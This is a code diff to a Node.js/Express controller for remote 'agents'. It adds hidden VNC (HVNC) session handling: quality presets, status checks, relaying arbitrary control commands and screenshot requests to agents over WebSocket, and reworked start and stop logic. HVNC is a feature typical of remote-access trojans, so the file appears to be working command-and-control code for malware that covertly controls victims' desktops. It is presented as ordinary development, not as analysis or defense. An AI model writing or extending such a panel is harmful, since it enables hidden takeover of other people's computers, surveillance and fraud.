@@ -3,6 +3,40 @@ const Task = require('../models/Task');
 const catchAsync = require('../utils/catchAsync');
 const AppError = require('../utils/appError');
 
+const VALID_HVNC_QUALITIES = ['low', 'medium', 'high'];
+const HVNC_QUALITY_PRESETS = {
+  low: { fps: 10, compression: 'high' },
+  medium: { fps: 15, compression: 'medium' },
+  high: { fps: 24, compression: 'low' }
+};
+const ACTIVE_HVNC_STATUSES = ['starting', 'active', 'stopping'];
+
+const parseHvncStartOptions = (body = {}) => {
+  const qualityRaw = typeof body.quality === 'string' ? body.quality.toLowerCase() : 'medium';
+  const quality = VALID_HVNC_QUALITIES.includes(qualityRaw) ? qualityRaw : 'medium';
+
+  const preset = HVNC_QUALITY_PRESETS[quality] || HVNC_QUALITY_PRESETS.medium;
+  const requestedFps = body.fps !== undefined ? parseInt(body.fps, 10) : preset.fps;
+  const fps = Number.isFinite(requestedFps) ? Math.min(60, Math.max(1, requestedFps)) : preset.fps;
+
+  const mode = typeof body.mode === 'string' && body.mode.length ? body.mode : 'desktop';
+  const additionalSettings = typeof body.settings === 'object' && body.settings !== null ? body.settings : {};
+
+  return {
+    quality,
+    fps,
+    mode,
+    compression: preset.compression,
+    settings: {
+      quality,
+      fps,
+      compression: preset.compression,
+      mode,
+      ...additionalSettings
+    }
+  };
+};
+
 /**
  * Get all agents with filtering options
  */
@@ -58,6 +92,186 @@ exports.getAllAgents = catchAsync(async (req, res, next) => {
     results: transformedAgents.length,
     data: {
       agents: transformedAgents
+    }
+  });
+});
+
+/**
+ * Get current HVNC session status
+ */
+exports.getHvncStatus = catchAsync(async (req, res, next) => {
+  const agentId = req.params.id;
+  const requestedSessionId = req.params.sessionId || req.query.sessionId;
+
+  const agent = await Client.findOne({ uuid: agentId }).lean();
+
+  if (!agent) {
+    return next(new AppError('No agent found with that ID', 404));
+  }
+
+  const session = agent.hvncSession || null;
+
+  if (!session || !session.sessionId) {
+    return res.status(200).json({
+      status: 'success',
+      data: {
+        session: null
+      }
+    });
+  }
+
+  if (requestedSessionId && requestedSessionId !== session.sessionId) {
+    return next(new AppError('No HVNC session found with the provided sessionId', 404));
+  }
+
+  return res.status(200).json({
+    status: 'success',
+    data: {
+      session
+    }
+  });
+});
+
+/**
+ * Forward HVNC control command to agent
+ */
+exports.sendHvncCommand = catchAsync(async (req, res, next) => {
+  const agentId = req.params.id;
+  const { sessionId, command } = req.body || {};
+
+  if (!command || typeof command !== 'object') {
+    return next(new AppError('HVNC command payload is required', 400));
+  }
+
+  if (!command.type || typeof command.type !== 'string') {
+    return next(new AppError('HVNC command type is required', 400));
+  }
+
+  const agent = await Client.findOne({ uuid: agentId });
+
+  if (!agent) {
+    return next(new AppError('No agent found with that ID', 404));
+  }
+
+  const activeSession = agent.hvncSession;
+  if (!activeSession || !activeSession.sessionId) {
+    return next(new AppError('No active HVNC session for this agent', 400));
+  }
+
+  if (sessionId && sessionId !== activeSession.sessionId) {
+    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
+  }
+
+  const wsHandler = require('../configs/ws.handler');
+  const clientConnection = wsHandler.getClientConnection(agent.uuid);
+
+  if (!clientConnection) {
+    return next(new AppError('Client WebSocket connection not found', 400));
+  }
+
+  const hvncMessage = {
+    type: 'hvnc_command',
+    sessionId: activeSession.sessionId,
+    command: {
+      type: command.type,
+      payload: typeof command.payload === 'object' && command.payload !== null ? command.payload : {},
+      timestamp: new Date().toISOString()
+    }
+  };
+
+  if (command.meta) {
+    hvncMessage.command.meta = command.meta;
+  }
+
+  if (command.sequence !== undefined) {
+    hvncMessage.command.sequence = command.sequence;
+  }
+
+  try {
+    clientConnection.send(JSON.stringify(hvncMessage));
+  } catch (error) {
+    console.error('Failed to forward HVNC command:', error);
+    return next(new AppError('Failed to communicate with agent', 500));
+  }
+
+  await Client.findOneAndUpdate(
+    { uuid: agentId },
+    {
+      $set: {
+        'hvncSession.status': 'active',
+        'hvncSession.lastUpdate': new Date()
+      },
+      $unset: {
+        'hvncSession.error': ''
+      }
+    }
+  );
+
+  return res.status(200).json({
+    status: 'success',
+    message: 'HVNC command relayed to agent',
+    data: {
+      sessionId: activeSession.sessionId
+    }
+  });
+});
+
+/**
+ * Request HVNC screenshot capture
+ */
+exports.captureHvncScreenshot = catchAsync(async (req, res, next) => {
+  const agentId = req.params.id;
+  const { sessionId, options } = req.body || {};
+
+  const agent = await Client.findOne({ uuid: agentId });
+
+  if (!agent) {
+    return next(new AppError('No agent found with that ID', 404));
+  }
+
+  const activeSession = agent.hvncSession;
+  if (!activeSession || !activeSession.sessionId) {
+    return next(new AppError('No active HVNC session for this agent', 400));
+  }
+
+  if (sessionId && sessionId !== activeSession.sessionId) {
+    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
+  }
+
+  const wsHandler = require('../configs/ws.handler');
+  const clientConnection = wsHandler.getClientConnection(agent.uuid);
+
+  if (!clientConnection) {
+    return next(new AppError('Client WebSocket connection not found', 400));
+  }
+
+  const hvncMessage = {
+    type: 'hvnc_screenshot',
+    sessionId: activeSession.sessionId,
+    options: typeof options === 'object' && options !== null ? options : {}
+  };
+
+  try {
+    clientConnection.send(JSON.stringify(hvncMessage));
+  } catch (error) {
+    console.error('Failed to request HVNC screenshot:', error);
+    return next(new AppError('Failed to communicate with agent', 500));
+  }
+
+  await Client.findOneAndUpdate(
+    { uuid: agentId },
+    {
+      $set: {
+        'hvncSession.lastUpdate': new Date()
+      }
+    }
+  );
+
+  return res.status(200).json({
+    status: 'success',
+    message: 'HVNC screenshot request sent to agent',
+    data: {
+      sessionId: activeSession.sessionId
     }
   });
 });
@@ -249,7 +463,7 @@ exports.sendCommand = catchAsync(async (req, res, next) => {
  */
 exports.startHvncSession = catchAsync(async (req, res, next) => {
   const agentId = req.params.id;
-  const { quality = 'medium', fps = 15 } = req.body;
+  const hvncOptions = parseHvncStartOptions(req.body);
   
   const agent = await Client.findOne({ uuid: agentId });
   
@@ -264,8 +478,12 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
   }
   
   // Check if agent supports HVNC
-  if (!agent.capabilities.features.includes('hvnc')) {
+  if (!agent.capabilities || !Array.isArray(agent.capabilities.features) || !agent.capabilities.features.includes('hvnc')) {
     return next(new AppError('Agent does not support HVNC', 400));
+  }
+
+  if (agent.hvncSession && agent.hvncSession.sessionId && ACTIVE_HVNC_STATUSES.includes(agent.hvncSession.status)) {
+    return next(new AppError('HVNC session already active for this agent', 409));
   }
   
   // Get WebSocket connection
@@ -283,11 +501,7 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
   const hvncCommand = {
     type: 'hvnc_start',
     sessionId,
-    settings: {
-      quality,
-      fps: parseInt(fps),
-      compression: quality === 'high' ? 'low' : 'high'
-    }
+    settings: hvncOptions.settings
   };
   
   try {
@@ -299,9 +513,11 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
         hvncSession: {
           sessionId,
           status: 'starting',
-          quality,
-          fps: parseInt(fps),
-          startedAt: new Date()
+          quality: hvncOptions.quality,
+          fps: hvncOptions.fps,
+          settings: hvncOptions.settings,
+          startedAt: new Date(),
+          lastUpdate: new Date()
         }
       }
     });
@@ -312,12 +528,14 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
       data: {
         sessionId,
         agentId,
-        quality,
-        fps: parseInt(fps),
-        status: 'starting'
+        quality: hvncOptions.quality,
+        fps: hvncOptions.fps,
+        status: 'starting',
+        settings: hvncOptions.settings
       }
     });
   } catch (wsError) {
+    console.error('Failed to send HVNC start command:', wsError);
     return next(new AppError('Failed to communicate with agent', 500));
   }
 });
@@ -327,23 +545,32 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
  */
 exports.stopHvncSession = catchAsync(async (req, res, next) => {
   const agentId = req.params.id;
-  const { sessionId } = req.body;
+  const { sessionId, clear = false } = req.body || {};
   
   const agent = await Client.findOne({ uuid: agentId });
   
   if (!agent) {
     return next(new AppError('No agent found with that ID', 404));
   }
+
+  const activeSession = agent.hvncSession;
+  if (!activeSession || !activeSession.sessionId) {
+    return next(new AppError('No active HVNC session for this agent', 400));
+  }
+
+  if (sessionId && sessionId !== activeSession.sessionId) {
+    return next(new AppError('Provided sessionId does not match active HVNC session', 400));
+  }
   
   // Get WebSocket connection
   const wsHandler = require('../configs/ws.handler');
   const clientConnection = wsHandler.getClientConnection(agent.uuid);
-  
-  if (clientConnection && agent.hvncSession) {
+
+  if (clientConnection) {
     // Send HVNC stop command to client
     const hvncCommand = {
       type: 'hvnc_stop',
-      sessionId: agent.hvncSession.sessionId
+      sessionId: activeSession.sessionId
     };
     
     try {
@@ -352,19 +579,27 @@ exports.stopHvncSession = catchAsync(async (req, res, next) => {
       console.error('Failed to send HVNC stop command:', wsError);
     }
   }
-  
-  // Clear HVNC session info
-  await Client.findOneAndUpdate({ uuid: agentId }, {
-    $unset: { hvncSession: 1 }
-  });
-  
+
+  const updateOperation = clear
+    ? { $unset: { hvncSession: 1 } }
+    : {
+        $set: {
+          'hvncSession.status': 'stopped',
+          'hvncSession.lastUpdate': new Date(),
+          'hvncSession.endedAt': new Date()
+        }
+      };
+
+  await Client.findOneAndUpdate({ uuid: agentId }, updateOperation);
+
   res.status(200).json({
     status: 'success',
-    message: 'HVNC session stopped',
+    message: clientConnection ? 'HVNC session stop requested' : 'HVNC session state cleared',
     data: {
-      sessionId: sessionId || (agent.hvncSession && agent.hvncSession.sessionId) || Date.now().toString(),
+      sessionId: activeSession.sessionId,
       agentId,
-      status: 'disconnected'
+      status: clear ? 'cleared' : 'stopped',
+      connectionNotified: Boolean(clientConnection)
     }
   });
 });
